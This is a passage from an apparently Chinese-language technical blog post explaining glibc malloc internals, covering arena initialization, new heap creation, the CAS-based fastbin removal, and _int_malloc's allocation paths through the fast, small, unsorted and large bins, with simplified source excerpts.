class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span> &#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">  ptmalloc_init ();</span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<strong>malloc_hook又被赋值成了NULL，然后再重新调用</strong>libc_malloc，这样就可以保证在多次调用__libc_malloc的情况下，代码1中的hook回调函数只会被调用一次，如下图所示：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170117.png" alt=""></p><p>这个函数里的ptmalloc_init的精简定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  __malloc_initialized = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line">  malloc_init_state (&amp;main_arena);</span><br><span class="line">  </span><br><span class="line">  __malloc_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到通过__malloc_initialized这个全局flag来检测是不是已经初始化过了，如果没有，则把main_arena设成当前的thread_arena，这是因为初始化肯定是主线程在做，而主线程用的是main_arena，然后再调用malloc_init_state进一步初始化，malloc_init_state定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast(DEFAULT_MXFAST);</span><br><span class="line">  av-&gt;top = initial_top (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc_init_state的part1把malloc_state中的bins array初始化成了下图所示：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170451.png" alt=""></p><p>malloc_init_state的part2把malloc_state中的top初始化成了指向上图2中的bin1，修改top后如下图所示：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170512.png" alt=""></p><h3 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h3><p>介玩意是个宏,源代码里有一段解释:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* arena_get() acquires an arena and locks the corresponding mutex.</span></span><br><span class="line"><span class="comment">   First, try the one last locked successfully by this thread.  (This</span></span><br><span class="line"><span class="comment">   is the common case and handled with a macro for speed.)  Then, loop</span></span><br><span class="line"><span class="comment">   once over the circularly linked list of arenas.  If no arena is</span></span><br><span class="line"><span class="comment">   readily available, create a new one.  In this latter case, `size&#x27;</span></span><br><span class="line"><span class="comment">   is just a hint as to how much memory will be required immediately</span></span><br><span class="line"><span class="comment">   in the new arena. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      ptr = thread_arena;      \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (ptr)      \</span></span><br><span class="line"><span class="meta">        __libc_lock_lock (ptr-&gt;mutex);      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">else</span>      \</span></span><br><span class="line"><span class="meta">        ptr = arena_get2 ((size), NULL);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>arena_get可以精简成如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123;                \</span></span><br><span class="line"><span class="meta">  ptr = thread_arena;                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ptr) &#123; __libc_lock_lock (ptr-&gt;mutex); &#125;  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123; ptr = arena_get2 ((size), NULL); &#125;    \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>可见主要的实现在arena_get2这个函数里，它的主要作用是为当前线程获取一个可用的arena，这个函数的实现很复杂，考虑了各种情况，函数里又嵌套调用了多个函数，我把关键的流程总结在下图里：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_171208.png" alt=""></p><p>上图可以看到，arena_get2的flow里主要调用了get_free_list、reused_arena、_int_new_arena这三个函数，这里不详细讲解每一个函数了，它们的作用从函数名就可以看出来，这三个函数里面_int_new_arena更重要一些，后面着重讲一下这一个函数。</p><h3 id="int-new-arena"><a href="#int-new-arena" class="headerlink" title="_int_new_arena"></a>_int_new_arena</h3><p>这个函数如前图所示，它是用来在arena的个数超出限制之前创建新的arena的，关键代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> mstate _int_new_arena(<span class="type">size_t</span> size) &#123;</span><br><span class="line">  <span class="comment">// 用指定size创建一个新的heap_info对象</span></span><br><span class="line">  heap_info *h = new_heap(size + (<span class="keyword">sizeof</span>(heap_info) </span><br><span class="line">      + <span class="keyword">sizeof</span>(malloc_state) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br><span class="line">  <span class="keyword">if</span> (!h) &#123;</span><br><span class="line">    <span class="comment">// 如果size过大导致new_heap失败，则创建一个只包含</span></span><br><span class="line">    <span class="comment">// 基础数据结构heap_info和malloc_state的对象</span></span><br><span class="line">    h = new_heap (<span class="keyword">sizeof</span> (heap_info) + <span class="keyword">sizeof</span> (malloc_state) </span><br><span class="line">        + MALLOC_ALIGNMENT, mp_.top_pad);</span><br><span class="line">    <span class="keyword">if</span> (!h) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 初始化malloc_state</span></span><br><span class="line">  malloc_state *a = h-&gt;ar_ptr = (malloc_state *) (h + <span class="number">1</span>);</span><br><span class="line">  malloc_init_state (a);</span><br><span class="line">  a-&gt;attached_threads = <span class="number">1</span>;</span><br><span class="line">  a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置malloc_state中的top chunk指针</span></span><br><span class="line">  <span class="comment">// 设置top chunk的header</span></span><br><span class="line">  <span class="type">char</span> *ptr = (<span class="type">char</span> *)(a + <span class="number">1</span>);</span><br><span class="line">  top(a) = (mchunkptr)ptr;</span><br><span class="line">  set_head(top(a), (((<span class="type">char</span> *)h + h-&gt;size) - ptr) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 更新malloc_state中的next链表，把新建的arena加到链表中</span></span><br><span class="line">  thread_arena = a;</span><br><span class="line">  a-&gt;next = main_arena.next;</span><br><span class="line">  main_arena.next = a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面再用一张memory layout的图示来展示刚创建过的arena长什么样子：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_192109.png" alt=""></p><p>前面的_int_new_arena函数中调用了new_heap这个函数，这个函数主要是通过mmap对应的系统调用来通过操作系统分配空间，精简过的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> heap_info *<span class="title function_">new_heap</span><span class="params">(<span class="type">size_t</span> size, <span class="type">size_t</span> top_pad)</span> &#123;</span><br><span class="line">  <span class="comment">// 通过系统调用分配内存</span></span><br><span class="line">  <span class="type">char</span> *p2 = (<span class="type">char</span> *)MMAP(aligned_heap_area, </span><br><span class="line">      HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">  <span class="keyword">if</span> (__mprotect(p2, size, </span><br><span class="line">      mtag_mmap_flags | PROT_READ | PROT_WRITE) != <span class="number">0</span>) &#123;</span><br><span class="line">    __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 初始化heap_info结构体</span></span><br><span class="line">  heap_info *h = (heap_info *)p2;</span><br><span class="line">  h-&gt;size = size;</span><br><span class="line">  h-&gt;mprotect_size = size;</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>还是先贴一个总流程图:</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/1638952496892-1639312615182.png" alt=""></p><h3 id="CAS操作"><a href="#CAS操作" class="headerlink" title="CAS操作"></a>CAS操作</h3><p>在malloc的实现中，需要频繁的插入和删除各个bin中的chunk，很多地方用到了CAS操作，因为用的比较多，这里先简单介绍一下</p><p>CAS是compare and swap的缩写，它是原子操作的一种，可用于在多线程编程中实现不被打断的数据交换操作，从而避免多线程同时改写某一数据时由于执行顺序不确定性以及中断的不可预知性产生的数据不一致问题，该操作通过将内存中的值与指定数据进行比较，当数值一样时将内存中的数据替换为新的值。</p><p>CAS需要有3个操作数：内存地址V，旧的预期值A，即将要更新的目标值B，CAS指令执行时，当且仅当内存地址V的值与预期值A相等时，将内存地址V的值修改为B，否则就什么都不做，整个比较并替换的操作是一个原子操作，下面举一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)                     \</span></span><br><span class="line"><span class="meta">  do &#123;                                                \</span></span><br><span class="line"><span class="meta">    victim = pp;                                      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (victim == NULL)                               \</span></span><br><span class="line"><span class="meta">      break;                                          \</span></span><br><span class="line"><span class="meta">    pp = REVEAL_PTR(victim-&gt;fd);                      \</span></span><br><span class="line"><span class="meta">  &#125; while ((pp = catomic_compare_and_exchange_val_acq \</span></span><br><span class="line"><span class="meta">      (fb, pp, victim)) != victim);</span></span><br></pre></td></tr></table></figure><p>上面这段代码是用来从fast bin中删除一个chunk，我们这里只关注<em>catomic_compare_and_exchange_val_acq(fb, pp, victim)</em>这个函数调用，其中fb是表头，pp新的节点，victim是老的节点，需要把老节点删掉，把新节点接上，这个调用就是通过CAS操作保证thread-safe的，以x86平台为例，一直往下追，最底层的实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __arch_c_compare_and_exchange_val_32_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123;                                                                  \</span></span><br><span class="line"><span class="meta">    __typeof(*mem) ret;                                               \</span></span><br><span class="line"><span class="meta">    __asm __volatile(<span class="string">&quot;cmpl $0, %%&quot;</span> SEG_REG <span class="string">&quot;:%P5\n\t&quot;</span>                 \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;je 0f\n\t&quot;</span>                                      \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;lock\n&quot;</span>                                         \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;0:\tcmpxchgl %2, %1&quot;</span>                            \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;=a&quot;</span>(ret), <span class="string">&quot;=m&quot;</span>(*mem)                          \</span></span><br><span class="line"><span class="meta">                     : BR_CONSTRAINT(newval), <span class="string">&quot;m&quot;</span>(*mem), <span class="string">&quot;0&quot;</span>(oldval), \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;i&quot;</span>(offsetof(tcbhead_t, multiple_threads)));   \</span></span><br><span class="line"><span class="meta">    ret;                                                              \</span></span><br><span class="line"><span class="meta">  &#125;)</span></span><br></pre></td></tr></table></figure><p>这是一段x86的内联汇编，GCC的内联汇编语法大家可以自行查阅相关资料，这里只关注lock和cmpxchgl这两个指令，lock确保对内存的read/write操作原子执行，cmpxchgl用来比较并交换操作数，所以归根结底，CAS操作还是通过硬件指令的支持才能实现原子操作。</p><h3 id="从fastbin分配"><a href="#从fastbin分配" class="headerlink" title="从fastbin分配"></a>从fastbin分配</h3><p>在_int_malloc的开始，先看申请的内存大小nb是否符合fast bin的限制，符合的话，首先进入fast bin的分配代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nb &lt;= get_max_fast()) &#123;</span><br><span class="line">  idx = fastbin_index(nb);</span><br><span class="line">  mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">  mchunkptr pp;</span><br><span class="line">  <span class="keyword">if</span> ((victim = *fb) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    REMOVE_FB(fb, pp, victim);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会根据nb得到fast bin的index，再根据index，得到指向所在bin的head指针fb，如果这个bin非空，则取第一个chunk，使用前面介绍的REMOVE_FB将其从所在bin删除，并将取到的chunk返回。</p><h3 id="从smallbin分配"><a href="#从smallbin分配" class="headerlink" title="从smallbin分配"></a>从smallbin分配</h3><p>不符合fast bin分配条件的话，会继续看是否符合small bin的分配条件，这部分的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">  idx = smallbin_index(nb);</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">    bin-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      set_non_main_arena(victim);</span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的处理过程和fast bin类似，也是根据nb定位到所在的bin，所在bin非空的话，就分配成功，返回得到的chunk，并且从所在bin中删除，和fast bin的最大不同之处在于这里操作的是双向链表。</p><h3 id="merge-fast-bin-into-unsorted-bin"><a href="#merge-fast-bin-into-unsorted-bin" class="headerlink" title="merge fast bin into unsorted bin"></a><strong>merge fast bin into unsorted bin</strong></h3><p>在fast bin和small bin都分配失败之后，会把fast bin中的chunk进行一次整理合并，然后将合并后的chunk放入unsorted bin中，这是通过malloc_consolidate这个函数完成的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="comment">// 因为这里会release所有的fast bin，所以先把相应flag disable</span></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line">  maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 两层循环</span></span><br><span class="line">  <span class="comment">// 1. 外层循环遍历所有fast bin</span></span><br><span class="line">  <span class="comment">// 2. 内层循环遍历bin中所有chunk</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 内层循环主要做了下面几件事，代码太长，略了</span></span><br><span class="line">        <span class="comment">// 1. 如果当前chunk的前一个chunk是free状态，进行合并</span></span><br><span class="line">        <span class="comment">// 2. 如果当前chunk的后一个chunk是free状态，进行合并</span></span><br><span class="line">        <span class="comment">// 3. 如果合并后的chunk不和top chunk挨着，</span></span><br><span class="line">        <span class="comment">//    将合并后的chunk插入到unsorted bin中</span></span><br><span class="line">        <span class="comment">// 4. 如果合并后的chunk和top chunk挨着，</span></span><br><span class="line">        <span class="comment">//    重新设置top chunk的起始位置</span></span><br><span class="line">      &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从unsorted-bin中分配"><a href="#尝试从unsorted-bin中分配" class="headerlink" title="尝试从unsorted bin中分配"></a><strong>尝试从unsorted bin中分配</strong></h3><p>这部分代码已经进入_int_malloc中最后那个最大的for循环了，这部分的工作在for循环的刚开始，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第一部分代码</span></span><br><span class="line">  <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line">    mchunkptr next = chunk_at_offset(victim, size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 符合这四个条件的话，从last remainder chunk分配</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb) </span><br><span class="line">        &amp;&amp; bck == unsorted_chunks(av) </span><br><span class="line">        &amp;&amp; victim == av-&gt;last_remainder </span><br><span class="line">        &amp;&amp; size &gt; (nb + MINSIZE)) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 。。。</span></span><br><span class="line">    <span class="comment">// 正好遇到请求大小的chunk，分配成功</span></span><br><span class="line">    <span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当前chunk属于small bin的范围，将其放回small bin</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 当前chunk属于large bin的范围，将其放回large bin</span></span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从unsorted bin中删除当前chunk</span></span><br><span class="line">    <span class="comment">// 。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断最大循环次数</span></span><br><span class="line">    <span class="keyword">if</span> (++iters &gt;= <span class="number">10000</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从large-bin中分配"><a href="#尝试从large-bin中分配" class="headerlink" title="尝试从large bin中分配"></a>尝试从large bin中分配</h3><p>这是_int_malloc中最后那个大for循环的第二部分代码，在从unsorted bin分配失败之后，准备从large bin分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第二部分代码</span></span><br><span class="line">  <span class="comment">// 判断nb的大小，符合条件的话从large bin分配</span></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断前面得到的bin是否为空</span></span><br><span class="line">    <span class="comment">// 不为空的话最大的chunk size是否大于等于请求大小nb</span></span><br><span class="line">    victim = first(bin);</span><br><span class="line">    <span class="keyword">if</span> (victim != bin &amp;&amp; chunksize_nomask(victim) &gt;= nb) &#123;</span><br><span class="line">      <span class="comment">// 1. 用best fit算法找到最合适大小的chunk</span></span><br><span class="line">      <span class="comment">// 2. 对这个chunk进行split，一部分返回给用户，</span></span><br><span class="line">      <span class="comment">// 剩余部分赋值给malloc_state中的remainder，</span></span><br><span class="line">      <span class="comment">// 同时插入到unsorted bin当中</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 在请求大小nb所在的bin分配失败，继续从后面的bin来分配，</span></span><br><span class="line">  <span class="comment">// 在查找后面bin的过程中，会用到binmap来加快查找速度</span></span><br><span class="line">  ++idx;</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line">  block = idx2block(idx);</span><br><span class="line">  <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">  bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// 如果后面没有找到合适的bin，就跳到use_top使用top chunk来分配</span></span><br><span class="line">    <span class="comment">// 如果后面找到了合适的bin，那么：</span></span><br><span class="line">    <span class="comment">// 1. 用best fit算法找到最合适大小的chunk</span></span><br><span class="line">    <span class="comment">// 2. 对这个chunk进行split，一部分返回给用户，</span></span><br><span class="line">    <span class="comment">// 剩余部分赋值给malloc_state中的remainder，</span></span><br><span class="line">    <span class="comment">// 同时插入到unsorted bin当中</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从top-chunk中分配"><a href="#尝试从top-chunk中分配" class="headerlink" title="尝试从top chunk中分配"></a>尝试从top chunk中分配</h3><p>这是_int_malloc中最后那个大for循环的第三部分代码，在从large bin分配失败之后，准备从top chunk分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第三部分代码</span></span><br><span class="line">  <span class="comment">// 前面都分配失败，从top chunk分配</span></span><br><span class="line">use_top:</span><br><span class="line">  victim = 